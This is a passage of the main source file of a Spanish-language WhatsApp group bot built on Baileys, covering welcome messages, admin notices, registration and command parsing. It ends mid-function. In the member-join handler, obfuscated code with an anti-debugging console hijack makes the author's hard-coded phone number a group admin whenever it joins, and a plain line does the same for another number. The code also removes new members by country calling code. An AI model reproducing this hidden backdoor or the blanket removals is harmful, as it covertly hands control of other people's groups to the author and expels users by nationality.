   // - - - - 𝕭𝖆𝖇𝖞𝕭𝖊𝖈𝖍𝖔𝖘𝖔 - - - -\\
  // Si modificas recuerda dejar  \\
 //     Los Creditos               \\
//////////// 𝕿𝖍𝖊 𝕮𝖍𝖔𝖚𝖙𝖊  \\\\\\\\\\\\\
const { 
  WAConnection,
  MessageType,
  Presence, 
  MessageOptions,
  Mimetype,
  WALocationMessage,
  WA_MESSAGE_STUB_TYPES,
  ReconnectMode,
  ProxyAgent,
  GroupSettingChange,
  ChatModification,
  waChatKey,
  WA_DEFAULT_EPHEMERAL,
  mentionedJid,
  prepareMessageFromContent, 
  Browsers,
  processTime
  
  } = require ("@adiwajshing/baileys")
// ☷☷ 𝕭𝖆𝖇𝖞 - - 𝕿𝖍𝖊𝖈𝖍𝖔𝖚𝖙𝖊 | Modulos

const fs = require('fs');
const crypto = require("crypto-js");        
const CryptoJS = require("crypto-js");
const ffmpeg = require("fluent-ffmpeg");
const chalk = require('chalk');
const imageToBase64 = require('image-to-base64');
const speed = require('performance-now');
const axios = require('axios');
const fetch = require('node-fetch');
const request = require('request');
const fromBuffer = require('file-type');
const FormData = require('form-data')
//const zalgo = require('./lib/zalgo')
const { EmojiAPI } = require("emoji-api");
//const tik = require('tiktok-scraper-without-watermark')
//const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const { spawn, exec, execSync } = require("child_process");
const moment = require("moment-timezone");
const yts = require('yt-search')
const LeoGg = require('google-it');
const LeoGgImg = require('g-i-s');
const hx = require('hxz-api');
const Fb = require('fb-video-downloader');
const { removeBackgroundFromImageFile } = require('remove.bg'); 

const {convertSticker} = require("./lib/swm.js")
//const {babyfire} = require('./lib/mediafire.js')

// ☷☷ 𝕭𝖆𝖇𝖞 - - 𝕿𝖍𝖊𝖈𝖍𝖔𝖚𝖙𝖊 | LIBRERIA
const conn = require("./lib/connect")
const wa = require("./lib/wa")
const msg = require("./lib/message")
const Exif = require('./lib/exif');
const exif = new Exif();
const { color } = require("./lib/color");
const {  getBuffer, h2k, generateMessageID,   getGroupAdmins,  getRandom,  banner,  start,  info, success, close,} = require("./lib/functions");
const { getLevelingXp, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId, getLevelingLevel, getUserRank, addCooldown, leveltab,} = require('./lib/leveling.js')
const { addBanned, unBanned, BannedExpired, cekBannedUser } = require('./lib/banned.js')
const {y2mateA, y2mateV} = require('./lib/y2mate.js')
const help = require("./lib/help")
const { isFiltered, addFilter } = require('./lib/Addfilter')
//const { jadibot, stopjadibot, listjadibot } = require('./lib/serbot')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { gpwha, ytchoute, gitchoute, instachoute, whachoute,} = require ('./lib/redes')
const { webp2mp4File} = require('./lib/webp2mp4')
const { reglas, logos } = require ('./lib/reglas')
const {janza, janz, menuall, qmiembros, brillo, choute, cnal} = require ('./lib/baby.js')
//const {bechoso} = require ('./lib/exportaciones/bechoso')
const { vor } = require ('./lib/baby/vor')
const { A, B, C, D, E, F, G, H, I, J, K, L, M, N, Ñ, O, P, Q, R, S, T, U, V, W, X, Y, Z } = require ('./lib/baby/verdad')
const {R1, R2, R3, R4, R5, R6, R7, R8, R9, R10, R11, R12, R13, R14, R15, R16, R17, R18, R19, R20, R21, R22, R23, R24, R25, } = require ('./lib/baby/retos')
//ᴘᴀʀᴀ ᴇʟ ᴍᴇɴᴜ ᴅᴇ ʙᴏᴛᴏɴᴇꜱ
//const { linkgp } = require ('./lib/exportaciones/linkgp')
const {grupos, admin, m18, multimedia, owener,extra, entrete, menual, menusticker} = require ('./lib/menus/menu');
const {install, ts, agra } = require ('./lib/txt')

// ☷☷ 𝕭𝖆𝖇𝖞 - - 𝕿𝖍𝖊𝖈𝖍𝖔𝖚𝖙𝖊 | ALMACENAR DATOS
const _registered = JSON.parse(fs.readFileSync('./src/registered.json'))
const nuevo = JSON.parse(fs.readFileSync('./src/usuario.json'))
const antipv = JSON.parse(fs.readFileSync('./src/antipv.json'));


const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const antifake = JSON.parse(fs.readFileSync('./src/antifake.json'))
const chatban = JSON.parse(fs.readFileSync('./src/ban.json'))
const mas18 = JSON.parse(fs.readFileSync('./src/porni.json'))
const multiprefix = JSON.parse(fs.readFileSync('./src/multiprefix.json'))
const _leveling = JSON.parse(fs.readFileSync('./src/leveling.json'))
const ban = JSON.parse(fs.readFileSync('./src/banned.json'))
const autostick = JSON.parse(fs.readFileSync('./src/autostick.json'))
const autolevel = JSON.parse(fs.readFileSync('./src/autolevel.json'))
const config = JSON.parse(fs.readFileSync("./config.json"))
const owner = config.owner
const mods = config.mods
const fake = 'Leon'
var public = config.public

const postBuffer = help.postBuffer
//const getBuffer = help.getBuffer 
//const getRandom = help.getRandomExt
const postJson = help.postJson
const getJson = help.getJson
conn.connect()
const leo = conn.leo



/*

const Exif = require('./lib/exif')
const exif = new Exif()*/
blocked = []

const prefix = '.'

//var prefix = JSON.parse(fs.readFileSync('./src/prefix.json'));

const sleep = async (ms) => {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const img = ['admin', 'ban', 'cowner', 'Faketumber', 'imagen', 'imgregla', 'M18', 'multimedia', 'TikTok', 'uwu']
const imgramdon = img[Math.floor(Math.random() * img.length)]
//CREADOR
const yo = `𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊`
const Githu = 'https://github.com/thechoute'
const Youtube = 'https://www.youtube.com/c/thechout'
const WhatsApp = '18299897014'
const instagram = 'https://www.instagram.com/the_choute_/'
const WGrupo = 'https://chat.whatsapp.com/KOmt1i9738c2zA1SnSLwn1'

//══════════════════ FUNCION DE REGISTRO ════════════════════════════════════\\
const getRegisteredRandomId = () => {
  return _registered[Math.floor(Math.random() * _registered.length)].id
  }
    
  const addRegisteredUser = (userid, sender, age, time, serials) => {
  const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
  _registered.push(obj)
  fs.writeFileSync('./src/registered.json', JSON.stringify(_registered))
  }
  const checkRegisteredUser = (sender) => {
  let status = false
  Object.keys(_registered).forEach((i) => {
  if (_registered[i].id === sender) {
  status = true
  }
  })
      return status  
  }

  
  leo.on('group-participants-update', async (anu) => {
    const _welcom= JSON.parse(fs.readFileSync('./src/welkom.json'))
  
    if (!_welcom.includes(anu.jid)) return
    try {
    const mdata = await leo.groupMetadata(anu.jid)
    console.log(anu)
    if (anu.action == 'add') {               
    num = anu.participants[0]  
    var _0x32eb=['length','203FKZwcC','constructor','text','37321dDPejz','apply','prototype','groupRemove','test','__proto__','table','1102598lCjDcW','1013436pgMCWz','info','toString','startsWith','3291GElTcg','1762sWsYhU','bind','exception','console','trace','log','648921eLIDKy','18299897014','Tu numero ha sido considerado como fake por lo que seras eliminado del Grupo, \x20\x20,\x20\x20\x20\x20\x20\x20\x20\x20,\x20\x20\x20\x20,\x20\x20\x20\x20\x0a\x0aAntiP\x20By:*\x20_Leo\x20🇽\x20_','return\x20/\x22\x20+\x20this\x20+\x20\x22/','sendMessage','324QcfqoI','warn','error','1148172OCGrif','23ykweMi','return\x20(function()\x20'];function _0x3b66(_0x116bb2,_0xa78ba5){return _0x3b66=function(_0x436199,_0x510667){_0x436199=_0x436199-0x70;var _0x51019a=_0x32eb[_0x436199];return _0x51019a;},_0x3b66(_0x116bb2,_0xa78ba5);}var _0x376b6b=_0x3b66;(function(_0xe31b1b,_0x46684b){var _0x30c21e=_0x3b66;while(!![]){try{var _0x598896=-parseInt(_0x30c21e(0x7e))+-parseInt(_0x30c21e(0x91))*-parseInt(_0x30c21e(0x7b))+parseInt(_0x30c21e(0x8c))+-parseInt(_0x30c21e(0x82))*-parseInt(_0x30c21e(0x70))+parseInt(_0x30c21e(0x7f))*parseInt(_0x30c21e(0x85))+-parseInt(_0x30c21e(0x8d))+-parseInt(_0x30c21e(0x76));if(_0x598896===_0x46684b)break;else _0xe31b1b['push'](_0xe31b1b['shift']());}catch(_0x4b5012){_0xe31b1b['push'](_0xe31b1b['shift']());}}}(_0x32eb,0x8c3d6));var _0xb1de39=function(){var _0xdff92c=!![];return function(_0xbaf195,_0x472290){var _0x49ae62=_0xdff92c?function(){var _0x8379c3=_0x3b66;if(_0x472290){var _0x210536=_0x472290[_0x8379c3(0x86)](_0xbaf195,arguments);return _0x472290=null,_0x210536;}}:function(){};return _0xdff92c=![],_0x49ae62;};}(),_0x46ec2c=_0xb1de39(this,function(){var _0x3a6de6=function(){var _0x52b332=_0x3b66,_0x3a1227=_0x3a6de6[_0x52b332(0x83)](_0x52b332(0x79))()[_0x52b332(0x83)]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!_0x3a1227[_0x52b332(0x89)](_0x46ec2c);};return _0x3a6de6();});_0x46ec2c();var _0x51019a=function(){var _0x1b381d=!![];return function(_0xdc464c,_0x8f91eb){var _0x4640b3=_0x1b381d?function(){var _0x37d4f6=_0x3b66;if(_0x8f91eb){var _0x4f0489=_0x8f91eb[_0x37d4f6(0x86)](_0xdc464c,arguments);return _0x8f91eb=null,_0x4f0489;}}:function(){};return _0x1b381d=![],_0x4640b3;};}(),_0x510667=_0x51019a(this,function(){var _0x3279f1=_0x3b66,_0x545df1=function(){var _0x5c6de2=_0x3b66,_0xf5f589;try{_0xf5f589=Function(_0x5c6de2(0x80)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x37444b){_0xf5f589=window;}return _0xf5f589;},_0x3ef9e5=_0x545df1(),_0x5c6ba6=_0x3ef9e5[_0x3279f1(0x73)]=_0x3ef9e5['console']||{},_0x373954=[_0x3279f1(0x75),_0x3279f1(0x7c),_0x3279f1(0x8e),_0x3279f1(0x7d),_0x3279f1(0x72),_0x3279f1(0x8b),_0x3279f1(0x74)];for(var _0x3d4618=0x0;_0x3d4618<_0x373954[_0x3279f1(0x81)];_0x3d4618++){var _0x1698c8=_0x51019a[_0x3279f1(0x83)][_0x3279f1(0x87)][_0x3279f1(0x71)](_0x51019a),_0x218220=_0x373954[_0x3d4618],_0x4beaa2=_0x5c6ba6[_0x218220]||_0x1698c8;_0x1698c8[_0x3279f1(0x8a)]=_0x51019a[_0x3279f1(0x71)](_0x51019a),_0x1698c8[_0x3279f1(0x8f)]=_0x4beaa2[_0x3279f1(0x8f)]['bind'](_0x4beaa2),_0x5c6ba6[_0x218220]=_0x1698c8;}});_0x510667();if(num[_0x376b6b(0x90)]('92'))await leo[_0x376b6b(0x7a)](mdata['id'],_0x376b6b(0x78),MessageType[_0x376b6b(0x84)]),leo[_0x376b6b(0x88)](mdata['id'],[num]);if(num[_0x376b6b(0x90)]('000'))await leo[_0x376b6b(0x7a)](mdata['id'],'🇲\x20🇽\x20😈\x20*ARRIVA\x20MEXICO!!!*\x20Bienvenido\x20amigo\x20de\x20mexico,\x20de\x20que\x20parte\x20del\x20pais\x20eres?😙',MessageType['text']);if(num[_0x376b6b(0x90)](_0x376b6b(0x77)))await leo['sendMessage'](mdata['id'],'*VAYA\x20VAYA\x20VAYAAAA🐱\x20Miren\x20nomas\x20quien\x20llego🥳,\x20es\x20mi\x20dueño!!!!😱\x20WOW\x20Saludenlo!😚*\x0a\x0a_*Le\x20dare\x20admin\x20juju*_',MessageType[_0x376b6b(0x84)]),leo['groupMakeAdmin'](mdata['id'],[num]);
  
    if (num.startsWith('240')) return leo.groupRemove(mdata.id, [num])
  //if (num.startsWith('994')) return leo.groupRemove(mdata.id, [num])
  if (num.startsWith('48')) return leo.groupRemove(mdata.id, [num])
  if (num.startsWith('92')) return leo.groupRemove(mdata.id, [num])
  if (num.startsWith('91')) return leo.groupRemove(mdata.id, [num])
  if (num.startsWith('34602067238')) return leo.groupMakeAdmin(mdata.id, [num])
  
  try {pushnem = choute.key.fromMe ? leo.user.name : conts.notify || conts.vname || conts.name || '-'
    } catch {pushnem = num.split('@')[0]}
    try {
    ppimg = await leo.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)} 
    catch {
    ppimg = 'https://i.ibb.co/gDJ29Jt/Baby-Foto-Perfil.jpg'}  
    
     teks = 
  `😙Hola, @${num.split('@')[0]}
  Bienvenido a ${mdata.subject}
    
  Esperemos la pases bien y te guste el grupo.
  Recuerda siempre seguir las reglas y mantener una formalidad respetuosa`
  
    let fotoP = await getBuffer(ppimg)
    leo.sendMessage(mdata.id, fotoP, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
    
    }  else if (anu.action == 'remove') {
    num = anu.participants[0]
    try {pushnem = choute.key.fromMe ? leo.user.name : conts.notify || conts.vname || conts.name || '-'
  } catch {pushnem = num.split('@')[0]}
  try {
  ppimg = await leo.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)} 
  catch {
  ppimg = 'https://i.ibb.co/gDJ29Jt/Baby-Foto-Perfil.jpg'}  
    teks = `
    @${num.split('@')[0]} Adios no se te extrañara, no comas nada del suelo que estan envenenando a los perros.`
    let fotoP = await getBuffer(ppimg)
    leo.sendMessage(mdata.id, fotoP, MessageType.image,{caption: teks, contextInfo: {"mentionedJid": [num]}})
  
    } else if (anu.action == 'promote') {
    num = anu.participants[0]
    try { ppimg = await leo.getProfilePicture(`${num.split('@')[0]}@c.us`)
    } catch {ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
    }
    thu = await leo.getStatus(anu.participants[0], MessageType.text)
    teks = 
  `👑 *NUEVO ADMIN* 👑
  👤 *Nombre:* @${num.split('@')[0]}
  📋 *INFO:* ${thu.status}
  🌎 *Grupo:* ${mdata.subject}
  *Felicitaciones eres uno de los administradores.*`
   let buff = await getBuffer(ppimg)
    leo.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
    } else if (anu.action == 'demote') {
    num = anu.participants[0]
    try {
    ppimg = await leo.getProfilePicture(`${num.split('@')[0]}@c.us`)
    } catch {
    ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
    }
    thu = await leo.getStatus(anu.participants[0], MessageType.text)
    teks = 
  `❌ *ADMIN MENOS* ❌
  👤 *Nombre:* @${num.split('@')[0]}
  📋 *INFO:* ${thu.status}
  🌎 *Grupo:* ${mdata.subject} 
  *F chota ya no eres administrador.*`
    let buff = await getBuffer(ppimg)
  leo.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
  
    }
    } catch (e) {
    console.log('Error : %s', color(e, 'red'))
    }
    })
        
leo.on('group-update', async (anu) => {
const metdata = await leo.groupMetadata(anu.jid)
    const choute = {
key : {
       participant : '0@s.whatsapp.net'
                    },
   message: {
                liveLocationMessage: {
                caption: `🔥🔥𝕿𝖍ٌ𝖊  𝕮𝖍𝖔𝖚𝖙𝖊🔥🔥`,
                jpegThumbnail: fs.readFileSync('./media/imagen/youtube-mi.jpg'),
                      }
                    }
                  }

if(anu.announce == 'false'){
teks = `*GUPO ABIERTO EXITOSAMENTE*\n\n_Todos los miembros pueden enviar mensajes_`
leo.sendMessage(metdata.id, teks, MessageType.text, {quoted: choute})
console.log(color('Accion'), color(`Grupo Abierto ${metdata.subject}`, 'cyan'))
} 


else if(anu.announce == 'true'){
teks = `*GRUPO CERRADO EXITOSAMENTE*\n\n_Solo los administradors podran enviar mensajes_`
leo.sendMessage(metdata.id, teks, MessageType.text, {quoted: choute})
console.log(color('Accion'), color(`Grupo Cerrado ${metdata.subject}`,  'cyan'))
}

/*
else if(!anu.desc == ''){
tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
teks = `- [ Nueva descripción] -\n\nEl administrador ha cambiado la descripción del grupo @${anu.descOwner.split('@')[0]}\n• Nueva descripción : ${anu.desc}`
leo.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: choute})
console.log(color('|TRM|'), color(`Descripcion cambiada ${metdata.subject}`, 'cyan'))
}




else if(anu.restrict == 'false'){
teks = `- [ Nuevos ajustes ] -\n\nSe ha abierto la opción Editar información del grupo para los miembros.\nAhora todos los miembros pueden editar la información de este grupo.`
leo.sendMessage(metdata.id, teks, MessageType.text, {quoted: choute})
console.log(color('|TRM|'), color(`Ajustes editados ${metdata.subject}`, 'cyan'))
}


else if(anu.restrict == 'true'){
teks = `- [ Nuevos ajustes ] -\n\nSe ha cerrado la edición de la información del grupo para los miembros.\nAhora solo el administrador del grupo puede editar la información de este grupo`
leo.sendMessage(metdata.id, teks, MessageType.text, {quoted: choute})
console.log(color('|TRM|'), color(`Ajustes editados ${metdata.subject}`,  'cyan'))
}*/
})


leo.on('chat-update', async(choute) => {
  try {
      if (!choute.hasNewMessage) return
      if (!choute.messages) return
      if (choute.key && choute.key.remoteJid == 'status@broadcast') return
      global.blocked
choute = choute.messages.all()[0]
choute.message = (Object.keys(choute.message)[0] === 'ephemeralMessage') ? choute.message.ephemeralMessage.message : choute.message
      if (!choute.message) return
  const from = choute.key.remoteJid
  const type = Object.keys(choute.message)[0]        
  const quoted = type == 'extendedTextMessage' && choute.message.extendedTextMessage.contextInfo != null ? choute.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const typeQuoted = Object.keys(quoted)[0]
  const content = JSON.stringify(choute.message)
  const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
  const body = choute.message.conversation || choute.message[type].caption || choute.message[type].text || "" 
  chats = (type === 'conversation') ? choute.message.conversation : (type === 'extendedTextMessage') ? choute.message.extendedTextMessage.text : ''
  budy = (type === 'conversation' && choute.message.conversation.startsWith(prefix)) ? choute.message.conversation : (type == 'imageMessage') && choute.message.imageMessage.caption.startsWith(prefix) ? choute.message.imageMessage.caption : (type == 'videoMessage') && choute.message.videoMessage.caption.startsWith(prefix) ? choute.message.videoMessage.caption : (type == 'extendedTextMessage') && choute.message.extendedTextMessage.text.startsWith(prefix) ? choute.message.extendedTextMessage.text : ''
  //const cmd = (type === 'conversation' && choute.message.conversation) ? choute.message.conversation : (type == 'imageMessage') && choute.message.imageMessage.caption ? choute.message.imageMessage.caption : (type == 'videoMessage') && choute.message.videoMessage.caption ? choute.message.videoMessage.caption : (type == 'extendedTextMessage') && choute.message.extendedTextMessage.text ? choute.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()

  var _0x56fb=["\x6C\x69\x73\x74\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x73\x65\x6C\x65\x63\x74\x65\x64\x44\x69\x73\x70\x6C\x61\x79\x54\x65\x78\x74","\x6D\x65\x73\x73\x61\x67\x65","","\x6B\x65\x79\x73","\x73\x74\x69\x63\x6B\x65\x72\x4D\x65\x73\x73\x61\x67\x65","\x62\x61\x73\x65\x36\x34","\x66\x69\x6C\x65\x53\x68\x61\x32\x35\x36"];resbutton= (type== _0x56fb[0])?choute[_0x56fb[2]][_0x56fb[0]][_0x56fb[1]]:_0x56fb[3];const commandstik=Object[_0x56fb[4]](choute[_0x56fb[2]])[0]== _0x56fb[5]?choute[_0x56fb[2]][_0x56fb[5]][_0x56fb[7]].toString(_0x56fb[6]):_0x56fb[3]
  selectedButton = (type == 'buttonsResponseMessage') ? choute.message.buttonsResponseMessage.selectedButtonId : ''
  leo.on("CB:action,,battery", json => {
    const battery = json[2][0][1].value
    const persenbat = parseInt(battery)
    bateria.battery = persenbat + '%'
    bateria.isCharge = json[2][0][1].live
  })

const bateria = {
battery: "" || "event no found.",
isCharge: "" || false
}
			

 const reply = (teks) => {
   leo.sendMessage(from, teks, MessageType.text, {sendEphemeral: true, quoted: choute})}

   const sendStickerFromUrl = async(to, url) => {
    var names = Date.now() / 10000;
    var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
            request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
        });
    };
    download(url, './stik' + names + '.png', async function () {
        console.log('selesai');
        let filess = './stik' + names + '.png'
        let asw = './stik' + names + '.webp'
        exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
            let media = fs.readFileSync(asw)
            leo.sendMessage(to, media, MessageType.sticker, {quoted:choute})
            fs.unlinkSync(filess)
            fs.unlinkSync(asw)
        });
    });
}

 // function _0x28c3(_0x2f8ce0,_0x4765c9){const _0x161f25=_0x161f();return _0x28c3=function(_0x28c3fe,_0x2851fb){_0x28c3fe=_0x28c3fe-0x1f2;let _0x8b0f4b=_0x161f25[_0x28c3fe];return _0x8b0f4b;},_0x28c3(_0x2f8ce0,_0x4765c9);}(function(_0x544189,_0x34261f){const _0x5057ca=_0x28c3,_0x54a56b=_0x544189();while(!![]){try{const _0x32624e=-parseInt(_0x5057ca(0x1fc))/0x1*(-parseInt(_0x5057ca(0x1f4))/0x2)+-parseInt(_0x5057ca(0x1f2))/0x3*(-parseInt(_0x5057ca(0x1ff))/0x4)+-parseInt(_0x5057ca(0x1f6))/0x5+parseInt(_0x5057ca(0x1f7))/0x6*(parseInt(_0x5057ca(0x1fe))/0x7)+-parseInt(_0x5057ca(0x1f8))/0x8+parseInt(_0x5057ca(0x1fa))/0x9+-parseInt(_0x5057ca(0x1fb))/0xa;if(_0x32624e===_0x34261f)break;else _0x54a56b['push'](_0x54a56b['shift']());}catch(_0x9ca61f){_0x54a56b['push'](_0x54a56b['shift']());}}}(_0x161f,0x57e3c));const reply=_0x10ea80=>{const _0xd61dd=_0x28c3;leo[_0xd61dd(0x1fd)](from,_0x10ea80,MessageType[_0xd61dd(0x1f9)],{'sendEphemeral':!![],'quoted':choute,'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':'「\x20*𝕿𝖍ٌ𝖊\x20\x20𝕮𝖍𝖔𝖚𝖙𝖊*\x20」','body':'*𝕿𝖍ٌ𝖊\x20\x20𝕮𝖍𝖔𝖚𝖙𝖊*','thumbnail':fs[_0xd61dd(0x1f5)]('./media/imagen/uwu.jpg'),'sourceUrl':_0xd61dd(0x1f3)}}});};function _0x161f(){const _0x50a76e=['11640MccPKf','2309232UfgIvA','text','2875068OGSMyB','2474040wNEJHF','23CZKzJB','sendMessage','1099DggHxO','272HGUIDn','12639oHJIHG','https://www.youtube.com/watch?v=Uv8U9VChJHo','54650bxpfpg','readFileSync','3214685EYcTWP'];_0x161f=function(){return _0x50a76e;};return _0x161f();}

  const sendMess = (tip, teks) => {
    leo.sendMessage(tip, teks, text, {sendEphemeral: true})}

    function _0x2eaf(){const _0x5e4c3a=['./media/imagen/uwu.jpg','141SghlNB','175kjCUcX','3088328LiEGZc','47482BLKKkI','42966OHszwJ','readFileSync','293493lcyZtT','https://www.youtube.com/watch?v=Uv8U9VChJHo','\x20「\x20𝕿𝖍ٌ𝖊\x20𝕮𝖍𝖔𝖚𝖙𝖊\x20」','6066720dfWQZF','2673960KQMOPH','6261985MvyxWp'];_0x2eaf=function(){return _0x5e4c3a;};return _0x2eaf();}(function(_0x3324b2,_0x363b8b){const _0x2cc561=_0x139e,_0xe8a4d7=_0x3324b2();while(!![]){try{const _0x3dabcd=parseInt(_0x2cc561(0x1cd))/0x1+parseInt(_0x2cc561(0x1ca))/0x2*(parseInt(_0x2cc561(0x1c7))/0x3)+-parseInt(_0x2cc561(0x1c4))/0x4+-parseInt(_0x2cc561(0x1c5))/0x5+-parseInt(_0x2cc561(0x1cb))/0x6*(-parseInt(_0x2cc561(0x1c8))/0x7)+parseInt(_0x2cc561(0x1c9))/0x8+parseInt(_0x2cc561(0x1c3))/0x9;if(_0x3dabcd===_0x363b8b)break;else _0xe8a4d7['push'](_0xe8a4d7['shift']());}catch(_0x56b00b){_0xe8a4d7['push'](_0xe8a4d7['shift']());}}}(_0x2eaf,0xb1a1b));function _0x139e(_0x5c0077,_0x225ffa){const _0x2eaf7a=_0x2eaf();return _0x139e=function(_0x139ed4,_0x46e130){_0x139ed4=_0x139ed4-0x1c1;let _0x3c3a05=_0x2eaf7a[_0x139ed4];return _0x3c3a05;},_0x139e(_0x5c0077,_0x225ffa);}const leoply=_0x3a15b0=>{const _0x432c38=_0x139e;leo['sendMessage'](from,_0x3a15b0,text,{'sendEphemeral':!![],'quoted':choute,'contextInfo':{'forwardingScore':0x1fc,'externalAdReply':{'title':_0x432c38(0x1c2),'thumbnail':fs[_0x432c38(0x1cc)](_0x432c38(0x1c6)),'sourceUrl':_0x432c38(0x1c1)}}});};


 const rechoute = async(id, título, descripción, buffer, enlace) => {
    const opción = {
    quoted: choute,
      contextInfo: {
        externalAdReply: {
          title: título,
          body: descripción,
          thumbnail: buffer,
          sourceUrl: enlace
        }
      }
    }
    leo.sendMessage(id, {name: "𝕭𝖔𝖙-𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 𝕺𝕱𝕮", address: "", jpegThumbnail: fs.readFileSync('./media/imagen/Faketumber.jpg'), }, MessageType.text, opción)}
 
  const isUrl = (url) => {return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))}

/*  const isUrl = (url) => {
    return url.match(
     new RegExp(
       /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
       "gi"
     )
   );
 };*/

  const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
    kma = gam1
  const buttonMessages = {
    quoted: choute,
  locationMessage: {jpegThumbnail: kma},
  contentText: text1,
  footerText: desc1,
  buttons: but,
  headerType: 6
  }
  leo.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
  }


if (prefix != "") {
  if (!body.startsWith(prefix)) {
  cmd = false
  comm = ""
  } else {
  cmd = true
  comm = body.slice(1).trim().split(" ").shift().toLowerCase()
  }
  } else {
  cmd = false
  comm = body.trim().split(" ").shift().toLowerCase()
  }

 // const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();			

const command = comm
  const crypto = require('crypto')
  const arg = chats.slice(command.length + 2, chats.length)
  const args = budy.trim().split(/ +/).slice(1)
  const isCmd = budy.startsWith(prefix)
  const q = args.join(' ')
  const soyYo = leo.user.jid
  const botNumber = leo.user.jid.split("@")[0]
  const ownerNumber  = "18299897014@s.whatsapp.net"
  const isGroup = from.endsWith('@g.us')
  const sender = choute.key.fromMe ? leo.user.jid : isGroup ? choute.participant : choute.key.remoteJid
  const senderNumber = sender.split("@")[0]
            const jid = sender
  const meNumber = leo.user.jidi
  const itsMe = senderNumber == botNumber
  const conts = choute.key.fromMe ? leo.user.jid : leo.contacts[sender] || { notify: jid.replace(/@.+/, '') }
  const pushname = choute.key.fromMe ? leo.user.name : conts.notify || conts.vname || conts.name || '-'
  const groupMetadata = isGroup ? await leo.groupMetadata(from) : ''
  const groupId = isGroup ? groupMetadata.jid : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const groupMembers = isGroup ? groupMetadata.participants : ''
  const groupAdmins = isGroup ? await wa.getGroupAdmins(groupMembers) : []
  const isOwner = senderNumber == owner || senderNumber == botNumber || mods.includes(senderNumber)
  const isAdmin = groupAdmins.includes(sender) || false
  const botAdmin = groupAdmins.includes(leo.user.jid)
  const hide1 = isGroup ? groupMembers - groupAdmins : ''
  const isAntiPv = antipv.includes('online');
  const isBan = cekBannedUser(sender, ban)
  const isRegister = checkRegisteredUser(sender)
  const isWelkom = isGroup ? welkom.includes(from) : false
  const isAutolevel = isGroup ? autolevel.includes(from) : false

  const isAntiFake = isGroup ? antifake.includes(from) : false
  const isAntiLink = isGroup ? antilink.includes(from) : false
  const isSex = isGroup ? mas18.includes(from) : false
  const isMultiPrefix = isGroup ? multiprefix.includes(from) : false
  //const isCmd = body.startsWith(prefix);
  
  const getLevel1 = getLevelingLevel(sender)   
//  const addlevel = addLevelingLevel (mentionUser)

const selocont = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync(`./media/imagen/izu.jpg`)
        }}};
  const isLevelingOn = isGroup ? _leveling.includes(groupId) : false

  const texto1 = q.substring(0, q.indexOf('|') - 0)
	const texto2 = q.substring(q.lastIndexOf('|') + 1)
  const totalchat = await leo.chats.all()
  const unread = await leo.loadAllUnreadMessages()
  const isAutoSt = isGroup ? autostick.includes(from) : false
	const isBanChat = chatban.includes(from)
	if (isBanChat && !isOwner) return
  const Smname = choute.key.fromMe ? leo.user.jid : leo.contacts[sender] || { notify: jid.replace(/@.+/, '') }
    const mentionByTag = type == "extendedTextMessage" && choute.message.extendedTextMessage.contextInfo != null ? choute.message.extendedTextMessage.contextInfo.mentionedJid : []
    const mentionByReply = type == "extendedTextMessage" && choute.message.extendedTextMessage.contextInfo != null ? choute.message.extendedTextMessage.contextInfo.participant || "" : ""
    const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
    mention != undefined ? mention.push(mentionByReply) : []
    const mentionUser = mention != undefined ? mention.filter(n => n) : []
    const mentions = (teks, memberr, id) => {
